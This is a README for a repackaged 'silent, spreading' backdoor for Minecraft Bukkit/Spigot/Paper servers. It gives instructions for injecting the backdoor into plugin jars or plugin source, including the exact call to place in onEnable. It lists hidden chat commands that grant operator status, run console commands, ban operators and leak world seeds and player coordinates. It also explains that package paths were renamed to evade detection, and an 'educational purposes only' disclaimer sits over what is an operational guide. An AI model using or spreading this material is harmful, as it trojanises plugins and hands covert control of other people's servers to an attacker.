# Thicc Industries' Minecraft Backdoor - REMSATERED

A silent, spreading backdoor for Minecraft Bukkit/Spigot/Paper servers.
Using the injector is recommended, should you choose to manually backdoor a plugin, you're on your own if you run into problems.

For educational purposes only. Do not use on a server you do not own.


If you need help join discord https://discord.gg/5T3ESC5HcX

## Backstory
I changed parts of this sofware because it was easy to detect you could look for the path ``com.thiccindustries.debugger`` and you would find files like ``Injector`` that normal plugins dont have so i have renamed some of the files and the paths to make it less likly that someone will find it. This software completely belongs to them and i am not saying i made this because i didnt i renamed some files and the paths.

## Requirements:
### Injector:
* Java 8 runtime.
* Desired target plugin jar file.
* Your Minecraft UUID. (You can find your UUID at: [NameMC](https://www.NameMC.com))
### Manual Injection:
* Java 8 JDK.
* Desired plugin source code.
* Plugin dependencies.
* Your Minecraft UUID. (You can find your UUID at: [NameMC](https://www.NameMC.com))
## Usage instructions:

### Injector:
* Run backdoor-(version).jar.
* Select desired plugin file.
* Input your Minecraft UUID.
* Input chat command prefix. (Default: #)

### Manual Injection:

* Download source code for desired plugin, and open in editor of your choice.
* Merge ``org.bukkit.debugger`` folder into the plugin's source.
* Open the Plugin's main source file, The file's class definition should look like this:
  ``public class Something extends JavaPlugin{}``
* Add the following line to the top of the file:
  ``import org.bukkit.debugger``
* Find the ``@Override public void onEnable(){}`` method.
* Add the following line to the beginning of the method:
  ``new Backdoor(this, new String[]{"[Your UUID Here]"}, [Your Chat Prefix Here]);``
> Note: Add multiple UUIDs by separating multiple "[uuid]" entries by commas.
* Change other configuration options in Config.java as desired.
* Compile plugin.

## Commands
Default command prefix is ``#``,  this can be changed.
* #op - Give player operator status
* #deop - Remove player's operator status
* #ban -  Ban player
* #banip - IP ban player
* #gamemode / gm - Change gamemode
* #give - Give items
* #32k - Enchant item in hand with level 32k enchants.
* #exec - Execute a command as the server console. **[Visible]**
* #chaos - Deop and Ban all ops currently online. Give admin to everyone else. **[Visible]**
* #seed - Find world seed
* #coords - Find player coordinates
* #tp - Teleport to coordinates **[Visible, See below.]**
* #auth - authorize new user
* #deauth - deauthorize user
* #help - List all available commands, with syntax and description.

Commands listed as **[Visible]** will be noticeable in Server console and or in-game chat.

Warning:
Teleporting may cause a '[player name] moved to quickly!' warning in server console. It may also cause anti-cheat to kick you.
Other strange behavior may occur when teleporting extreme distances. (such as to the world border)

## License
This software is provided under the GPL3 License.

Credit to **Rikonardo** for his [Bukloit](https://github.com/Rikonardo/Bukloit) project, which helped in the development of the Injector.